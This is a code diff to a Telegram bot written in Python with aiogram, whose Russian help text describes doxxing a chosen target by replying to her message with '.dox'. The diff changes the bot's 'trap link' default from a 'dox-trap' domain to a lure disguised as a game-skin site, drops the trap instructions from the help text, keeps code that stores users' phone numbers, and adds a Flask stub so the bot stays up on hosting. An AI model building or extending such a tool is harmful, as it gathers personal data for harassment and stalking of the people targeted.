@@ -1,12 +1,13 @@
-import os, sqlite3, asyncio, requests
+import os, sqlite3, asyncio, requests, threading
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message
 from aiogram.filters import Command
 from aiogram.client.default import DefaultBotProperties
+from flask import Flask
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 OWNER_ID  = int(os.getenv("OWNER_ID", "0"))
-TRAP_URL  = os.getenv("TRAP_URL", "https://dox-trap.onrender.com")
+TRAP_URL  = os.getenv("TRAP_URL", "https://skin-cs.onrender.com")
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp  = Dispatcher()
@@ -75,10 +76,7 @@ async def start(m: Message):
         "Как юзать:\n"
         "1. Добавь меня в чат с целью\n"
         "2. Свайпни влево по её сообщению (Reply)\n"
-        "3. Напиши <code>.dox</code>\n\n"
-        "Ссылка-ловушка:\n"
-        f"<code>{TRAP_URL}/g/метка</code>\n\n"
-        "Показать переходы: <code>.hits</code>"
+        "3. Напиши <code>.dox</code>"
     )
 
 @dp.message(F.text.startswith(".dox"))
@@ -127,7 +125,19 @@ async def on_contact(m: Message):
     if m.contact and m.contact.user_id:
         CONTACTS[m.contact.user_id] = m.contact.phone_number
 
+# ---- заглушка для Render Web Service ----
+web = Flask(__name__)
+
+@web.route("/")
+def home():
+    return "OK", 200
+
+def run_web():
+    port = int(os.getenv("PORT", 10000))
+    web.run(host="0.0.0.0", port=port)
+
 async def main():
+    threading.Thread(target=run_web, daemon=True).start()
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
